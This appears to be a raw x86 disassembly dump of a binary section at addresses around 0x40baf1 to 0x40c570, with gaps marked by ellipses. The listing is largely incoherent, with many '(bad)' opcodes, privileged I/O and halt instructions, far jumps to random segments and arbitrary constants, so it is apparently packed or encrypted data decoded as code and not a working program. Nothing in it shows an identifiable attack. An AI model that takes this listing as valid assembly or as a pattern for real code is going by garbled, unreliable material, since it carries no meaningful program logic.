  40baf1:	aad    0xfe
  40baf3:	imul   esi,ebp,0xc581be53
  40baf9:	pop    ebx
  40bafa:	or     eax,eax
  40bafc:	or     DWORD PTR [esi-0x1f22afb2],edx
  40bb02:	xchg   ebp,eax
  40bb03:	push   DWORD PTR [edx+0x37]
  40bb06:	fcomp  DWORD PTR [ecx+0xf]
  40bb09:	pop    edi
  40bb0a:	push   0x0
  40bb0c:	hlt    
  40bb0d:	out    dx,eax
  40bb0e:	push   esp
  40bb0f:	call   FWORD PTR [edi+edx*2]
  40bb12:	hlt    
  40bb13:	imul   ebx,DWORD PTR [esp+ebx*2],0x42b9e804
  40bb1a:	add    al,0x0
  40bb1c:	daa    
  40bb1d:	add    bl,BYTE PTR [ecx-0x412610f9]
  40bb23:	xchg   ebp,eax
  40bb24:	or     DWORD PTR [eax-0x21],0xffffffda
  40bb28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb29:	test   BYTE PTR [edi+0x466ad25e],ch
  40bb2f:	adc    BYTE PTR [edi+esi*8],bl
  40bb32:	jge    0x40bb20
	...
  40bb5c:	add    BYTE PTR [edi-0x10a8eb83],bl
  40bb62:	dec    esp
  40bb63:	das    
  40bb64:	dec    ecx
  40bb66:	lds    edx,FWORD PTR [ecx]
  40bb68:	jne    0x40bb7e
  40bb6a:	sbb    bh,BYTE PTR [ebx]
  40bb6c:	nop
  40bb6d:	inc    ebx
  40bb6e:	mov    BYTE PTR [esi+edi*8-0x73e5564f],dh
  40bb75:	mov    ds,WORD PTR [eax+0x13]
  40bb78:	mov    esp,DWORD PTR [ecx+ebp*8]
  40bb7b:	add    eax,0x988217f8
  40bb80:	inc    esi
  40bb81:	test   eax,0x13501707
  40bb86:	xor    bh,bh
  40bb88:	(bad)  
  40bb89:	xchg   ecx,eax
  40bb8a:	mov    esp,0xc601ab1a
  40bb8f:	adc    DWORD PTR [ecx+0x457fc061],ecx
  40bb95:	in     al,dx
  40bb96:	je     0x40bbab
  40bb98:	jne    0x40bbb2
  40bb9a:	lea    edx,[edi+0x102bf407]
  40bba0:	(bad)  
  40bba1:	fld    TBYTE PTR [ebx]
  40bba3:	enter  0xd3f7,0x6f
  40bba7:	adc    al,0xff
  40bba9:	push   ecx
  40bbaa:	in     al,dx
  40bbab:	adc    DWORD PTR [ebp-0x38],esi
  40bbae:	add    eax,0x5bc4fb98
  40bbb3:	clc    
  40bbb4:	adc    DWORD PTR [ebx-0x54d48e4a],esi
  40bbba:	xor    BYTE PTR [ebp-0x722f39e5],dl
  40bbc0:	adc    al,BYTE PTR [eax]
	...
  40bbea:	fwait
  40bbeb:	xor    BYTE PTR [ecx+0x7dd06e1b],al
  40bbf1:	adc    dh,dh
  40bbf3:	pop    edx
  40bbf4:	push   ds
  40bbf5:	adc    ecx,DWORD PTR [ecx]
  40bbf7:	arpl   WORD PTR [ecx+0x65b6a89d],ax
  40bbfd:	jle    0x40bc5e
  40bbff:	adc    bh,BYTE PTR [esi-0x169ca1c4]
  40bc05:	mov    eax,0x9069c796
  40bc0a:	daa    
  40bc0b:	pop    ebp
  40bc0c:	mov    ebx,0xd93052e4
  40bc11:	adc    dl,cl
  40bc13:	bound  eax,QWORD PTR [ecx-0x46]
  40bc16:	xchg   ebx,eax
  40bc17:	mov    dh,0x2d
  40bc19:	adc    dh,BYTE PTR [ecx+0x1b98264a]
  40bc1f:	ret    
  40bc20:	dec    ebp
  40bc21:	adc    BYTE PTR [ebx],ch
  40bc23:	mov    dh,0x15
  40bc25:	cwde   
  40bc26:	adc    esi,DWORD PTR [esi-0xfc046d]
  40bc2c:	add    edx,DWORD PTR [edx]
  40bc2e:	adc    esi,DWORD PTR [esi+0x300af373]
  40bc34:	loope  0x40bc51
  40bc36:	push   esi
  40bc37:	mov    dh,0xed
  40bc39:	adc    DWORD PTR [edi+0x1e7afd0f],esp
  40bc3f:	mov    dh,0x53
  40bc41:	hlt    
  40bc42:	jmp    0xcdb7:0x951be12f
  40bc49:	adc    DWORD PTR [edi+0x4f537],ebx
	...
  40bc77:	dec    edx
  40bc78:	dec    ebp
  40bc79:	mov    esi,0xffb61b97
  40bc7e:	cmp    eax,eax
  40bc80:	mov    ebp,0xb60dac77
  40bc85:	(bad)  
  40bc86:	sbb    al,0xa8
  40bc88:	mov    ah,0x74
  40bc8a:	icebp  
  40bc8b:	pop    es
  40bc8c:	dec    eax
  40bc8d:	std    
  40bc8e:	xchg   esi,eax
  40bc8f:	or     eax,0xb9f974b6
  40bc94:	dec    ebp
  40bc95:	(bad)  
  40bc96:	cld    
  40bc97:	xchg   edi,eax
  40bc98:	mov    ebp,0xb62d5980
  40bc9d:	(bad)  
  40bc9e:	cld    
  40bc9f:	(bad)  
  40bca0:	mov    ah,0x74
  40bca2:	loope  0x40bcbb
  40bca4:	test   eax,0xa40d668e
  40bca9:	sar    ecx,0x1f
  40bcac:	adc    BYTE PTR [ebx+0xc300d45],cl
  40bcb2:	ret    
  40bcb3:	push   ds
  40bcb4:	mov    dh,0x74
  40bcb6:	icebp  
  40bcb7:	aaa    
  40bcb8:	cmp    DWORD PTR [eax+0x74b62d3e],edx
  40bcbe:	in     eax,0x2c
  40bcc0:	xor    BYTE PTR [eax],cl
  40bcc2:	inc    ecx
  40bcc3:	add    eax,0xb126feb5
  40bcc8:	movups xmm6,XMMWORD PTR [eax+0x22]
  40bccc:	mov    dh,0x74
  40bcce:	in     eax,0xc
  40bcd0:	xor    BYTE PTR [eax],cl
  40bcd2:	add    DWORD PTR [ebp-0x4b],edx
  40bcd5:	inc    BYTE PTR [esi]
  40bcd7:	xchg   ecx,eax
  40bcd8:	push   cs
  40bcd9:	adc    al,0x70
	...
  40bd03:	add    BYTE PTR [edx],ah
  40bd05:	mov    ah,0x74
  40bd07:	in     eax,0x2c
  40bd09:	or     BYTE PTR cs:[ecx],al
  40bd0c:	gs mov ch,0xfe
  40bd0f:	out    0x70,al
  40bd11:	push   cs
  40bd12:	sbb    BYTE PTR [eax+0x21],dh
  40bd15:	mov    ds:0xe1ffdc1,al
  40bd1a:	mov    edi,DWORD PTR [ebp+0xeb9fa0]
  40bd20:	xor    esi,edx
  40bd22:	std    
  40bd23:	jne    0x40bd16
  40bd25:	(bad)  
  40bd26:	(bad)  
  40bd27:	inc    BYTE PTR [eax]
  40bd29:	mov    bh,0xe6
  40bd2b:	sbb    DWORD PTR [ebp+0x4b],edx
  40bd2e:	(bad)  
  40bd2f:	call   DWORD PTR [eax]
  40bd31:	mov    bl,0xfd
  40bd33:	jne    0x40bce2
  40bd35:	push   eax
  40bd36:	mov    cl,BYTE PTR [edi-0xf74b476]
  40bd3c:	pushf  
  40bd3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd3e:	(bad)  
  40bd3f:	inc    DWORD PTR [ebp-0x9ebbac9]
  40bd45:	lahf   
  40bd46:	(bad)  
  40bd47:	je     0x40bdb9
  40bd49:	push   ecx
  40bd4a:	add    DWORD PTR ss:[ebp-0x6ba38a8],eax
  40bd51:	push   edi
  40bd52:	add    BYTE PTR [eax],al
  40bd54:	jne    0x40bd8b
  40bd56:	inc    ebp
  40bd57:	cld    
  40bd58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd59:	dec    ebx
  40bd5a:	jne    0x40bd70
  40bd5c:	jmp    0xe6b0:0x90ff0ecc
  40bd63:	repnz or ecx,DWORD PTR [ebx-0x1]
  40bd67:	mov    eax,DWORD PTR [eax]
	...
  40bd91:	or     eax,0x45fc7cdf
  40bd96:	int3   
  40bd97:	and    DWORD PTR [eax-0x58],ebp
  40bd9a:	add    al,0x40
  40bd9c:	add    BYTE PTR [edx],cl
  40bd9e:	int    0xfa
  40bda0:	call   0x4096ca
  40bda5:	(bad)  
  40bda6:	pop    ss
  40bda7:	jne    0x40bdb6
  40bda9:	lods   eax,DWORD PTR ds:[esi]
  40bdaa:	sub    al,0x5d
  40bdac:	inc    ecx
  40bdad:	cmc    
  40bdae:	dec    edx
  40bdaf:	jne    0x40bdad
  40bdb1:	sbb    eax,0x500804b
  40bdb6:	xor    DWORD PTR [ebp-0x14],eax
  40bdb9:	into   
  40bdba:	pop    ebx
  40bdbb:	mov    DWORD PTR [ebp-0x27],0x1c00005e
  40bdc2:	ret    0x7d81
  40bdc5:	enter  0x96c1,0x17
  40bdc9:	inc    esp
  40bdca:	ret    
  40bdcb:	add    ch,bh
  40bdcd:	mov    dh,ah
  40bdcf:	cwde   
  40bdd0:	or     esi,DWORD PTR [esi+ecx*4+0x4bbff73]
  40bdd7:	cdq    
  40bdd8:	sti    
  40bdd9:	mov    bl,0x56
  40bddb:	add    al,ch
  40bddd:	xor    BYTE PTR [ebx],dh
  40bddf:	ud0    esi,DWORD PTR [ebp+0x1c000438]
  40bde6:	cmp    ecx,ecx
  40bde8:	adc    ebx,DWORD PTR [edi+0x21750299]
  40bdee:	retf   
  40bdef:	test   DWORD PTR [eax],eax
  40bdf1:	sbb    al,0xc2
  40bdf3:	inc    ebp
  40bdf4:	inc    ebp
	...
  40be1d:	add    BYTE PTR [ecx+eax*8+0x2],dh
  40be21:	add    BYTE PTR [eax*4-0x3de30c37],bl
  40be28:	add    al,BYTE PTR [eax]
  40be2a:	pop    ebx
  40be2b:	push   es
  40be2c:	adc    eax,DWORD PTR [eax]
  40be2e:	sbb    al,0xc2
  40be30:	add    cl,BYTE PTR [ebp-0x734b8e27]
  40be36:	loope  0x40bea5
  40be38:	mov    ah,0x8c
  40be3a:	fldcw  WORD PTR [ecx-0x4c]
  40be3d:	(bad)  
  40be3e:	mov    cl,0x8d
  40be40:	or     eax,0x254a2475
  40be45:	(bad)  
  40be46:	sub    edx,DWORD PTR [ebx+eax*4+0x7d]
  40be4a:	xor    cl,al
  40be4c:	xchg   esi,eax
  40be4d:	xor    bl,BYTE PTR [edi-0x77fff521]
  40be53:	xchg   DWORD PTR [ecx-0x683aef83],eax
  40be59:	add    eax,0x13279f
  40be5e:	jo     0x40be03
  40be60:	or     eax,0xe65bf475
  40be65:	cwde   
  40be66:	pop    ss
  40be67:	ret    
  40be68:	stc    
  40be69:	je     0x40be4e
  40be6b:	mov    dl,0xd5
  40be6d:	cwde   
  40be6e:	iret   
  40be6f:	mov    dl,0x53
  40be71:	add    ah,al
  40be73:	arpl   WORD PTR [eax+0xe],bx
  40be76:	retf   
  40be77:	mov    dl,0x33
  40be79:	adc    al,0xc3
  40be7b:	sub    ch,ah
  40be7d:	sbb    edi,DWORD PTR [ecx+0xeadcb]
	...
  40beab:	mov    bl,0x28
  40bead:	mov    eax,ds:0x9dcebe1b
  40beb2:	push   cs
  40beb3:	mov    ds:0x761b9d28,eax
  40beb8:	into   
  40beb9:	lea    ecx,[esi]
  40bebb:	xchg   ebx,eax
  40bebc:	sub    BYTE PTR [ecx+0x1b],bh
  40bebf:	outs   dx,BYTE PTR ds:[esi]
  40bec0:	into   
  40bec1:	jge    0x40bed1
  40bec3:	shl    DWORD PTR [ebp+0x76],cl
  40bec6:	(bad)  
  40bec7:	mov    al,ds:0x730e6e40
  40becc:	fsubrp st(3),st
  40bece:	pop    ds
  40becf:	sbb    al,0x27
  40bed1:	call   FWORD PTR [ecx-0x244e9d]
  40bed7:	inc    ebx
  40bed8:	inc    ebp
  40bed9:	jns    0x40bee9
  40bedb:	push   ebx
  40bedc:	inc    ebp
  40bedd:	jmp    0x519f8ff0
  40bee2:	mov    ds:0x9935b293,eax
  40bee7:	cmp    esi,DWORD PTR [ecx+0x93bffb3]
  40beed:	jns    0x40befd
  40beef:	sub    esi,DWORD PTR [edx-0x2fcbf06d]
  40bef5:	jns    0x40bf05
  40bef7:	sbb    esp,DWORD PTR [ecx]
  40bef9:	loop   0x40bf10
  40befb:	and    ebx,eax
  40befd:	inc    ebx
  40befe:	or     eax,0xad9db20b
  40bf03:	aam    0x9c
  40bf05:	(bad)  
  40bf06:	fcomp  DWORD PTR [edi]
  40bf08:	or     BYTE PTR [ebx-0x1c696203],cl
  40bf0e:	aas    
	...
  40bf37:	add    BYTE PTR [ecx],bl
  40bf39:	sub    BYTE PTR [eax],cl
  40bf3b:	shl    DWORD PTR [ebp+0x57d6fee4],1
  40bf41:	sbb    ah,dh
  40bf43:	push   0xffffffa3
  40bf45:	lods   eax,DWORD PTR ds:[esi]
  40bf46:	(bad)  
  40bf49:	jmp    0x5b60a84e
  40bf4e:	pop    esi
  40bf4f:	mov    al,ds:0xae00635e
  40bf54:	mov    ebx,DWORD PTR [ecx-0x18]
  40bf57:	adc    al,0x2b
  40bf59:	mov    dl,0xfe
  40bf5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf5c:	fld    TBYTE PTR [ecx+0x5b1fe900]
  40bf62:	lea    esp,[eax+eiz*1]
  40bf65:	or     edi,edi
  40bf67:	cld    
  40bf68:	xchg   DWORD PTR [ecx-0x4dee9304],edi
  40bf6e:	mov    BYTE PTR [esp+ecx*1],ch
  40bf71:	fidivr WORD PTR [ecx+esi*2+0x18]
  40bf75:	daa    
  40bf76:	or     al,0x6a
  40bf78:	fwait
  40bf79:	mov    ch,0x1
  40bf7b:	fistp  DWORD PTR [ecx]
  40bf7d:	fidivr WORD PTR [ebp+edx*2+0x22]
  40bf81:	sub    DWORD PTR [edx],ecx
  40bf83:	xchg   ecx,eax
  40bf84:	pop    ds
  40bf85:	pop    ebx
  40bf86:	add    cl,ch
  40bf88:	jns    0x40bf2c
  40bf8a:	shl    ecx,0x1f
  40bf8d:	loopne 0x40bfd3
  40bf8f:	xor    DWORD PTR [eax-0x50],esi
  40bf92:	je     0x40bf75
  40bf94:	pop    ss
  40bf95:	lea    ecx,[esi+eiz*1+0x217cde19]
	...
  40bfc4:	add    BYTE PTR [eax],bl
  40bfc6:	daa    
  40bfc7:	add    al,0xe2
  40bfc9:	pop    edi
  40bfca:	daa    
  40bfcb:	or     dl,BYTE PTR [ecx+0x1f]
  40bfce:	pop    ebx
  40bfcf:	add    BYTE PTR [eax],al
  40bfd1:	cmc    
  40bfd2:	inc    bh
  40bfd4:	ret    0x5d0d
  40bfd7:	cmp    DWORD PTR [ebp-0xf],0x59
  40bfdb:	jb     0x40bffc
  40bfdd:	push   eax
  40bfde:	cwde   
  40bfdf:	not    BYTE PTR [eax+0x4f]
  40bfe2:	mov    edi,0x54ed75fd
  40bfe7:	cs mov ?,edx
  40bfea:	pop    edi
  40bfeb:	lea    eax,[ebp-0x13]
  40bfee:	in     al,dx
  40bfef:	std    
  40bff0:	jne    0x40bfbf
  40bff2:	push   esp
  40bff3:	sahf   
  40bff4:	lea    eax,[edx-0x16ba76a1]
  40bffa:	push   ebx
  40bffb:	sbb    eax,0x505ef88d
  40c000:	dec    DWORD PTR [eax]
  40c002:	scas   eax,DWORD PTR es:[edi]
  40c003:	out    0x8d,al
  40c005:	xor    BYTE PTR [edi-0x1],bl
  40c008:	mov    DWORD PTR [eax-0x7d],ecx
  40c00b:	lea    eax,[ebp-0x53]
  40c00e:	in     al,dx
  40c00f:	push   0x6c9a204
  40c014:	call   0x3fee8e
  40c019:	add    BYTE PTR [ecx-0x36fdaf0a],bl
  40c01f:	push   es
  40c020:	call   0x40224b
  40c025:	mul    al
  40c027:	loop   0x40c02a
	...
  40c051:	add    BYTE PTR [eax-0x42],bh
  40c054:	mov    eax,DWORD PTR [ebp-0x13]
  40c057:	jmp    0x40c056
  40c059:	jne    0x40c03c
  40c05b:	pop    esi
  40c05c:	jne    0x40c06a
  40c05e:	add    cl,cl
  40c060:	push   es
  40c061:	call   0x402209
  40c066:	rcr    BYTE PTR [eax-0x36fdaf0a],1
  40c06c:	push   es
  40c06d:	call   0x402244
  40c072:	sbb    al,0x45
  40c074:	mov    ?,edi
  40c076:	sbb    al,0xc7
  40c078:	clc    
  40c079:	mov    bh,0x1c
  40c07b:	ret    0x2
  40c07e:	bound  ebp,QWORD PTR [ebx+0x41]
  40c081:	or     BYTE PTR [edi+esi*1],bl
  40c084:	(bad)  
  40c085:	test   DWORD PTR [ecx+eax*8-0x6c],0xf80eebfb
  40c08d:	(bad)  
  40c08e:	imul   ebp,DWORD PTR [edx-0x77267fe6],0x8a51830a
  40c098:	add    esi,DWORD PTR [ebp+0x16]
  40c09b:	fiadd  DWORD PTR [ebx]
  40c09d:	add    BYTE PTR [edx+eax*8],bl
  40c0a0:	test   al,0xc8
  40c0a2:	fidivr WORD PTR [ecx-0x15a672fe]
  40c0a8:	mov    bl,0xfe
  40c0aa:	xor    DWORD PTR [edx-0x2f6ef1e6],ebp
  40c0b0:	or     cl,BYTE PTR [ebx+0xeda8c]
	...
  40c0de:	add    BYTE PTR [edx+eax*8],bl
  40c0e1:	or     DWORD PTR [ebp+0x14],esi
  40c0e4:	retf   0x8e48
  40c0e7:	xor    DWORD PTR [eax],0xffffffcf
  40c0ea:	inc    esp
  40c0eb:	jo     0x40c09b
  40c0ed:	(bad)  
  40c0ee:	call   0x43825e
  40c0f3:	lahf   
  40c0f4:	mov    dh,0x6
  40c0f6:	push   es
  40c0f7:	out    dx,al
  40c0f8:	push   ebp
  40c0f9:	jns    0x40c140
  40c0fb:	push   esp
  40c0fc:	icebp  
  40c0fd:	or     DWORD PTR [ebp+0x24],esi
  40c100:	sbb    ah,BYTE PTR [edi]
  40c102:	mov    WORD PTR [ebx+0x18],cs
  40c105:	jns    0x40c14c
  40c107:	inc    esp
  40c108:	ror    DWORD PTR [ecx],1
  40c10a:	jne    0x40c130
  40c10c:	sbb    cl,dh
  40c10e:	stc    
  40c10f:	xor    eax,DWORD PTR [eax+0x5a244579]
  40c115:	mov    ecx,0x1162a90a
  40c11a:	ficom  DWORD PTR ds:0x597915af
  40c120:	mov    bl,0xb8
  40c122:	or     dl,BYTE PTR [ecx+0x7371163]
  40c128:	scas   eax,DWORD PTR es:[edi]
  40c129:	std    
  40c12a:	jl     0x40c18d
  40c12c:	stos   DWORD PTR es:[edi],eax
  40c12d:	arpl   cx,ax
  40c12f:	jmp    0x40c13c
  40c131:	out    dx,al
  40c132:	nop
  40c133:	and    eax,ebx
  40c135:	lods   al,BYTE PTR ds:[esi]
  40c136:	push   cs
  40c137:	jecxz  0x40c0e7
  40c139:	outs   dx,DWORD PTR ds:[esi]
  40c13a:	rol    bh,0xe0
  40c13d:	sub    ecx,DWORD PTR [esp+ebp*2]
  40c140:	scas   al,BYTE PTR es:[edi]
  40c141:	push   ebx
  40c142:	cld    
	...
  40c16b:	add    bl,al
  40c16d:	call   0xe503cc33
  40c172:	and    ebx,DWORD PTR [edi+ebx*4]
  40c175:	xor    BYTE PTR [ecx+0x6a2a2803],bh
  40c17b:	mov    BYTE PTR [edi-0x6166e2a5],dh
  40c181:	xor    BYTE PTR [ecx+0x6a361003],dl
  40c187:	mov    BYTE PTR [ebx+0x3a5155b],cl
  40c18d:	int    0x23
  40c18f:	lds    eax,FWORD PTR [ebx-0x7bec0c53]
  40c195:	sbb    al,0xf7
  40c197:	add    ebx,DWORD PTR [edx+eiz*2]
  40c19a:	test   eax,0x74430990
  40c19f:	test   al,0xdc
  40c1a1:	pop    edx
  40c1a2:	pop    esi
  40c1a3:	nop
  40c1a4:	dec    ebx
  40c1a5:	ret    
  40c1a6:	sbb    BYTE PTR [edx+0x43e1ae53],cl
  40c1ac:	rcr    DWORD PTR [edi-0x2f],1
  40c1af:	jo     0x40c192
  40c1b1:	sbb    ebp,ecx
  40c1b3:	or     dh,BYTE PTR [ecx+0x4640ffaa]
  40c1b9:	xor    BYTE PTR [eax],al
  40c1bb:	jmp    0xd7b4afea
  40c1c0:	xchg   DWORD PTR [esi-0x519af102],ebp
  40c1c6:	je     0x40c1ad
  40c1c8:	aaa    
  40c1c9:	and    cl,BYTE PTR [esi+0x74ae160e]
  40c1cf:	stc    
	...
  40c1f8:	add    BYTE PTR ds:0x81110c28,dl
  40c1fe:	(bad)  
  40c200:	mul    BYTE PTR ds:0x9beeec28
  40c206:	popa   
  40c207:	call   0xfeef288a
  40c20c:	fisubr WORD PTR [ebx-0x2ba3014b]
  40c212:	mov    ch,0x8b
  40c214:	pop    edi
  40c215:	adc    eax,0x283cfeae
  40c21a:	ret    
  40c21b:	jo     0x40c275
  40c21d:	and    eax,0x143cfeae
  40c222:	ret    
  40c223:	push   0xfeae1558
  40c228:	sbb    al,0x0
  40c22a:	ret    
  40c22b:	pusha  
  40c22c:	js     0x40c253
  40c22e:	scas   al,BYTE PTR es:[edi]
  40c22f:	dec    ebp
  40c230:	push   0xffffff9b
  40c232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c233:	call   DWORD PTR [eax+ecx*4]
  40c236:	pusha  
  40c237:	div    dh
  40c239:	add    ah,BYTE PTR [esi-0x1dda8103]
  40c23f:	inc    esp
  40c240:	jno    0x40c208
  40c242:	mov    ds:0x81fe1c1,al
  40c247:	mov    edx,DWORD PTR [ebp-0x67]
  40c24a:	xchg   esi,eax
  40c24b:	sti    
  40c24c:	pop    esi
  40c24d:	stos   DWORD PTR es:[edi],eax
  40c24e:	popa   
  40c24f:	call   0xfeeeaa49
  40c254:	loop   0x40c235
  40c256:	daa    
  40c257:	das    
  40c258:	add    al,cl
  40c25a:	in     eax,dx
  40c25b:	cli    
  40c25c:	push   eax
	...
  40c285:	add    ch,cl
  40c287:	xor    ecx,DWORD PTR [eax+0x7563eaff]
  40c28d:	cld    
  40c28e:	cli    
  40c28f:	fisttp QWORD PTR [edx]
  40c291:	call   0x3fef4c
  40c296:	push   cs
  40c297:	sbb    DWORD PTR [edi+ecx*1+0x2a],esi
  40c29b:	fadd   QWORD PTR [esi]
  40c29d:	push   DWORD PTR [eax+0x1887e854]
  40c2a3:	(bad)  
  40c2a4:	dec    DWORD PTR [ebx]
  40c2a6:	inc    ebp
  40c2a7:	fdiv   st(6),st
  40c2a9:	(bad)  
  40c2aa:	jo     0x40c300
  40c2ac:	call   0xffa34039
  40c2b1:	leave  
  40c2b2:	mov    bh,0xb0
  40c2b4:	(bad)  
  40c2b5:	push   esp
  40c2b6:	dec    esi
  40c2b7:	inc    esp
  40c2b8:	add    esp,0xffff62b1
  40c2be:	sub    BYTE PTR ds:0x63dafeb8,0x0
  40c2c5:	add    ch,al
  40c2c7:	pop    eax
  40c2c8:	mov    eax,DWORD PTR [ebp-0x47]
  40c2cb:	scas   eax,DWORD PTR es:[edi]
  40c2cc:	mov    esi,0x37d8c074
  40c2d1:	add    BYTE PTR [eax],al
  40c2d3:	lods   al,BYTE PTR ds:[esi]
  40c2d4:	out    0x51,eax
  40c2d6:	test   BYTE PTR [eax+0x0],bl
  40c2d9:	push   DWORD PTR [eax]
  40c2db:	mov    bl,0xe6
  40c2dd:	sub    ecx,edi
  40c2df:	(bad)  
  40c2e0:	dec    DWORD PTR [ebx]
  40c2e2:	mov    ch,0xdd
  40c2e4:	or     eax,0x3fe88468
	...
  40c311:	add    BYTE PTR [eax],al
  40c313:	jmp    0xff2b:0x22e80adc
  40c31a:	dec    esi
  40c31c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c31d:	pushw  es
  40c31f:	xchg   ebp,eax
  40c320:	cdq    
  40c321:	(bad)  
  40c322:	(bad)  
  40c323:	sbb    al,0x8f
  40c325:	mul    bh
  40c327:	in     al,0x25
  40c329:	or     bh,bh
  40c32b:	xchg   ebp,eax
  40c32c:	aas    
  40c32d:	dec    ebx
  40c32e:	(bad)  
  40c32f:	cmp    ebp,DWORD PTR [ebp-0x65]
  40c332:	cmp    eax,0x8d02c21d
  40c337:	mov    eax,ds:0x23ff0980
  40c33c:	repnz sbb dl,al
  40c33f:	lods   al,BYTE PTR ds:[esi]
  40c340:	dec    esp
  40c341:	or     BYTE PTR [ebp-0xf68067],cl
  40c347:	or     esi,edx
  40c349:	pop    es
  40c34a:	mov    ch,0xc4
  40c34c:	push   ebx
  40c34d:	or     bh,bh
  40c34f:	add    al,0xc0
  40c351:	xchg   bh,bh
  40c353:	repz cmp bh,BYTE PTR [esi-0x44]
  40c357:	jmp    0x133e:0x134006bc
  40c35e:	add    BYTE PTR [edx+eax*8],bl
  40c361:	ja     0x40c2f8
  40c363:	fiadd  WORD PTR [ebx-0x402c00fa]
  40c369:	repnz inc ebx
  40c36c:	ror    DWORD PTR [esi-0x27805684],0x4f
  40c373:	inc    esp
  40c374:	out    0xb6,al
  40c376:	inc    eax
	...
  40c39f:	add    BYTE PTR [edx+ebx*4],bl
  40c3a2:	es jnp 0x40c3c1
  40c3a5:	ret    0xbff9
  40c3a8:	adc    DWORD PTR [edi-0x3de356e5],esi
  40c3ae:	add    cl,BYTE PTR [ebp-0xfa004f]
  40c3b4:	and    DWORD PTR [esi],0xffffffc2
  40c3b7:	sub    ecx,esp
  40c3b9:	dec    ecx
  40c3ba:	push   es
  40c3bb:	dec    edi
  40c3bc:	ffree  st(1)
  40c3be:	sbb    al,dl
  40c3c0:	out    0xc1,eax
  40c3c2:	add    cl,BYTE PTR [ebx]
  40c3c4:	pop    esp
  40c3c5:	pop    edx
  40c3c6:	fadd   QWORD PTR [eax]
  40c3c8:	inc    ebp
  40c3c9:	fsubp  st(0),st
  40c3cb:	add    ebx,DWORD PTR [esp+ebp*4]
  40c3ce:	fcomi  st,st(7)
  40c3d0:	inc    ebx
  40c3d1:	loope  0x40c444
  40c3d3:	pop    es
  40c3d4:	inc    ebx
  40c3d5:	pop    edi
  40c3d6:	sub    DWORD PTR [ecx-0x4383bcd6],edx
  40c3dc:	fcomp  QWORD PTR [edx+0x36]
  40c3df:	xchg   ecx,eax
  40c3e0:	pop    ss
  40c3e1:	ret    
  40c3e2:	and    eax,0x11ab2373
  40c3e7:	cli    
  40c3e8:	test   DWORD PTR [ebx+0x1e],ebx
  40c3eb:	xchg   ecx,eax
  40c3ec:	daa    
  40c3ed:	mov    bl,0x51
  40c3ef:	jae    0x40c3fc
  40c3f1:	stos   DWORD PTR es:[edi],eax
  40c3f2:	pop    ebx
  40c3f3:	jno    0x40c3d3
  40c3f5:	test   eax,0xda90705
  40c3fa:	int    0xb1
  40c3fc:	arpl   WORD PTR [ebx-0x55148d0b],si
  40c402:	cwde   
  40c403:	push   es
	...
  40c42c:	add    BYTE PTR [ecx+0x4b],ch
  40c42f:	cmp    DWORD PTR [edi],eax
  40c431:	push   ecx
  40c432:	push   ebx
  40c433:	ror    DWORD PTR [ecx],1
  40c435:	shr    BYTE PTR [edx-0x2539e42b],cl
  40c43b:	int    0x6
  40c43d:	mov    bh,0x1e
  40c43f:	je     0x40c402
  40c441:	pop    es
  40c442:	aam    0x63
  40c444:	dec    edi
  40c445:	mov    dl,0xaa
  40c447:	mov    ch,0x6
  40c449:	xor    DWORD PTR [ebx-0x52],ecx
  40c44c:	push   eax
  40c44d:	push   0x8406a5a9
  40c452:	adc    BYTE PTR ds:0xa9561c04,bl
  40c458:	pop    DWORD PTR [ebx+0x33]
  40c45b:	dec    esp
  40c45c:	mov    ebx,0x90865adc
  40c461:	daa    
  40c462:	mov    bl,0xd
  40c464:	jae    0x40c4d9
  40c466:	stos   BYTE PTR es:[edi],al
  40c467:	push   DWORD PTR [ebp-0x34]
  40c46a:	out    dx,al
  40c46b:	std    
  40c46c:	outs   dx,BYTE PTR ds:[esi]
  40c46d:	sbb    cl,BYTE PTR [ebx]
  40c46f:	call   0xfeea9312
  40c474:	mov    ecx,0xe174a98f
  40c479:	daa    
  40c47a:	sub    edi,esi
  40c47c:	dec    esi
  40c47d:	sbb    dh,BYTE PTR [ebx-0x55dd894c]
  40c483:	mov    WORD PTR [ebp+ebx*8-0x58],fs
  40c487:	(bad)  
  40c488:	outs   dx,DWORD PTR ss:[esi]
  40c48a:	test   eax,0xaa196db4
  40c48f:	(bad)  
  40c490:	adc    DWORD PTR [eax],eax
	...
  40c4ba:	add    BYTE PTR ds:0x9a9ce900,ah
  40c4c0:	push   cs
  40c4c1:	ins    BYTE PTR es:[edi],dx
  40c4c2:	imul   DWORD PTR [eax-0xfe5f102]
  40c4c8:	mov    ebx,0xe7aa2207
  40c4cd:	aad    0xa6
  40c4cf:	test   eax,0xe35bf6fe
  40c4d4:	std    
  40c4d5:	out    dx,al
  40c4d6:	sbb    DWORD PTR [ebx-0x55de897c],esi
  40c4dc:	enter  0xd4ab,0xa9
  40c4e0:	push   ebx
  40c4e1:	bound  esp,QWORD PTR [esp+ebx*8]
  40c4e4:	ret    
  40c4e5:	cdq    
  40c4e6:	sbb    ch,BYTE PTR [edx-0x1cc45102]
  40c4ec:	std    
  40c4ed:	mov    esi,0xe9005b19
  40c4f2:	pop    ds
  40c4f3:	(bad)  
  40c4f4:	inc    esp
  40c4f5:	frstor [ecx+ebp*8+0x629fec73]
  40c4fc:	add    BYTE PTR [ebx+edx*4],dl
  40c4ff:	mov    dl,0x8
  40c501:	call   0xe8a92025
  40c506:	iret   
  40c507:	sbb    al,BYTE PTR [eax]
  40c509:	add    BYTE PTR [edx-0x5d17f527],ah
  40c50f:	sub    al,0xff
  40c511:	(bad)  
  40c512:	cld    
  40c513:	sub    DWORD PTR [eax+0x685ff2fe],edi
  40c519:	ds inc esp
  40c51b:	pop    ebp
  40c51c:	add    BYTE PTR [ebp+0x0],cl
	...
  40c546:	add    BYTE PTR [eax-0xd0001e4],bh
  40c54c:	out    dx,al
  40c54d:	out    0x67,al
  40c54f:	loop   0x40c5b0
  40c551:	dec    DWORD PTR [ebp-0x1e338]
  40c557:	repnz out dx,al
  40c559:	std    
  40c55a:	mov    ch,0xad
  40c55c:	pusha  
  40c55d:	(bad)  
  40c55e:	(bad)  
  40c55f:	fnsave ds:0x2605007a
  40c565:	test   DWORD PTR [ebx+esi*1+0x240ff5e],edi
  40c56c:	sub    esi,eax
  40c56e:	add    ch,dh
  40c570:	pop    esp
